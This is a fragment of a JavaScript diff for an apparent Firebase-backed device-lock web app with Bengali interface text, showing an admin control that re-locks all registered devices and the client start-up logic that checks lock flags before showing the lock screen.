+  this.disabled=true;this.innerHTML='<i class="fas fa-check-circle"></i> সব আনলক করা হয়েছে';
+  document.getElementById('raBtn2').style.display='flex';
+});
+document.getElementById('raBtn2').addEventListener('click',function(){
+  db.ref('global/lockEnabled').set(true);
+  Object.keys(devCache).forEach(function(k){db.ref('devices/'+k).update({locked:true,startTime:Date.now(),unlockAttempts:0,openAttempts:0});});
+  db.ref('logs').push({time:new Date().toLocaleTimeString('bn-BD'),msg:'গ্লোবাল লক পুনরায় সক্রিয়',device:'admin',model:'Admin'});
+  this.style.display='none';var sb=document.getElementById('saBtn2');sb.disabled=false;sb.innerHTML='<i class="fas fa-stop-circle"></i> সব ডিভাইস আনলক করুন';
+});
+
+/* ===== ইনিশিয়ালাইজ ===== */
+function init(){
+  if(isAdm()){initAdm();return;}
+  regDev();setupPresence();
+  fbGl.once('value',function(snap){
+    if(snap.val()===false){
+      document.getElementById('ls').style.display='none';
+      document.getElementById('wot').style.display='flex';return;
+    }
+    fbLk.once('value',function(s2){
+      if(s2.val()===false){
+        document.getElementById('ls').style.display='none';
+        document.getElementById('wot').style.display='flex';return;
+      }
+      startLock();
+    });
+  });
 }
 
 if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',init);
